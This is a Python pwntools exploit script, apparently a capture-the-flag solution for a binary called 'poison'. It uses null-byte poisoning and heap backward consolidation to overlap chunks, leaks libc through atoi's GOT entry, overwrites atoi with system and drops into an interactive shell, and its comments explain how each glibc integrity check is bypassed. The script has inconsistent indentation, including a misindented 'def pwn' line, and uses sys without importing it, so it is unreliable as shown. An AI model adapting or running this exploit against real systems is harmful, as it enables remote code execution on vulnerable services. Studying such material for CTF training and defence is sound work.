from pwn import *

atoi_got = 0x602058
atoi_off = 0x39ea0
sys_off  = 0x46590

def alloc(size, data):

    r.sendlineafter('>> ', '1')
    r.sendlineafter('Size: ', str(size))

    if size > len(data):
        data += '\n'
    r.sendafter('Data: ', data)

    return

def edit(idx, data):

    r.sendlineafter('>> ', '2')
    r.sendlineafter('Index: ', str(idx))
    r.sendafter('Data: ', data)

    return

def free(idx):

    r.sendlineafter('>> ', '3')
    r.sendlineafter('Index: ', str(idx))

    return

def dump(idx):

	r.sendlineafter('>> ', '4')
	r.sendlineafter('Index: ', str(idx))

	r.recvuntil('Data: ')

	return u64(r.recv(6).ljust(8, '\x00'))
  
 def pwn():

	alloc(0x88, 'A'*0x88)	# chunk 0
	alloc(0x108, 'B'*0x108) # chunk 1

	free(0)

	# Leaking the skiddy way
	alloc(0x8, 'C'*0x8) 

	##################################################################
	#
	#	0x603020:	0x0000000000000000	0x0000000000000021
	#	0x603030:	0x4343434343434343	0x00007ffff7dd3838 <-- main_arena + 216
	#
	##################################################################

	##################################################################
	#
	#		 --==[[ Bypass double-free check ]]==--
	#
	#	    /* Or whether the block is actually not marked used.  */
	#		if (__glibc_unlikely (!prev_inuse(nextchunk)))
        #  		malloc_printerr ("double free or corruption (!prev)");
        #
        ##################################################################
        
  	alloc(0x208, 'D'*(0x208 - 16) + p64(0x91)) # chunk 2

	##################################################################
	#
	#	0x6031e0:	0x4242424242424242	0x0000000000000211 - -
	#	0x6031f0:	0x4444444444444444	0x4444444444444444    |
	#	0x603200:	0x4444444444444444	0x4444444444444444    |
	#					...                           | + 0x200 [after the null byte poison]
	#	0x6033d0:	0x4444444444444444	0x4444444444444444    |
	#	0x6033e0:	0x4444444444444444	0x0000000000000091 < - - - - > make sure the in_use bit is set   
	#	0x6033f0:	0x000000000000000a	0x0000000000020c11			 to prevent double-free corruption
	#
	##################################################################

	# Null byte poison
	edit(1, 'B'*0x100 + p64(0x160))
  
  	##################################################################
	#
	# 		--==[[ Prevent forward consolidation ]]==--
	#
	#    	if (nextchunk != av->top) {
        #  	  /* get and clear inuse bit */
        #  	  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
        #
        #  	  /* consolidate forward */
        # 	  if (!nextinuse) {
	#	    unlink(av, nextchunk, bck, fwd);
	#	    size += nextsize;
        #     	  } else
	#	    clear_inuse_bit_at_offset(nextchunk, 0);
	#
	##################################################################
  
        alloc(0x108, 'E'*0x78 + p64(0x91)) # chunk 3
  
	##################################################################
	#
	#	0x6033e0:	0x4444444444444444	0x0000000000000091 - -
	#	0x6033f0:	0x000000000000000a	0x0000000000000111    |
	#				...			              | + 0x90
	#	0x603460:	0x4545454545454545	0x4545454545454545    |
	#	0x603470:	0x4545454545454545	0x0000000000000091 < - - - - > make sure the in_use bit is set
	#																to prevent forward consolidation
	##################################################################

	##################################################################
	#
	# 		--==[[ Backward consolidation ]]==--
	#    
	#		if (!prev_inuse(p)) {
        #  			prevsize = prev_size (p);
        #  			size += prevsize;
        #  			p = chunk_at_offset(p, -((long) prevsize));
        #  			unlink(av, p, bck, fwd);
        #		}
        #		
        #		Chunk @ 0x603080 bypasses all unlink's mitigations
        #
        #  		#define unlink(AV, P, BK, FD) {
        #			if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      
        #	 			malloc_printerr ("corrupted size vs. prev_size");			      
        #			FD = P->fd;								      
        #			BK = P->bk;								      
        #			if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      
        # 				malloc_printerr ("corrupted double-linked list");
        #			...
        #                }
	#	
	#	0x603080:	0x4141414141414141	0x0000000000000031 < -
	#	0x603090:	0x00007ffff7dd37d8	0x00007ffff7dd37d8    |
	#	0x6030a0:	0x4141414141414141	0x4141414141414141    |
	#	0x6030b0:	0x0000000000000030	0x0000000000000020 < -| - - in use chunk about to get overlapped
	#	0x6030c0:	0x0000000000000108	0x00000000006030e0    |
	#	0x6030d0:	0x0000000000000000	0x0000000000000111    | chunk_at_offset(0x6031e0, -((long) 0x160)) = free = unlink
	#					...                           |
	#	0x6031e0:	0x0000000000000160	0x0000000000000200 - -
	#
	##################################################################

	free(2)

	##################################################################
	#
	# 		 if alloc(size) <= alloc(0x361) {
	#			return 0x603090;
	#		 }
	#		
	#	0x603080:	0x4141414141414141	0x0000000000000361 <-- new consolidate size 
	#	0x603090:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
	#	0x6030a0:	0x4141414141414141	0x4141414141414141
	#	0x6030b0:	0x0000000000000030	0x0000000000000020 <-- chunk in use
	#	0x6030c0:	0x0000000000000108	0x00000000006030e0 <-- about to overwrite that
	#	0x6030d0:	0x0000000000000000	0x0000000000000111
	#	0x6030e0:	0x4242424242424242	0x4242424242424242
	#
	##################################################################

	# Overwrite the heap pointer of the chunk with atoi's address
	alloc(0x108, 'F'*0x30 + p64(0x8) + p64(atoi_got))

	##################################################################
	#	
	#	0x603080:	0x4141414141414141	0x0000000000000111
	#	0x603090:	0x4646464646464646	0x4646464646464646
	#	0x6030a0:	0x4646464646464646	0x4646464646464646
	#	0x6030b0:	0x4646464646464646	0x4646464646464646
	#	0x6030c0:	0x0000000000000008	0x0000000000602058 <-- atoi's GOT entry
	#
	##################################################################

	# Leaking the 1337 way
	atoi   = dump(1)
	libc   = atoi - atoi_off
	system = libc + sys_off

	log.info("atoi:   0x{:x}".format(atoi))
	log.info("Libc:   0x{:x}".format(libc))
	log.info("system: 0x{:x}".format(system))

	# atoi => system
	edit(1, p64(system))

	# Game over
	r.sendline('sh')

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./poison')
        pause()
        pwn()
  
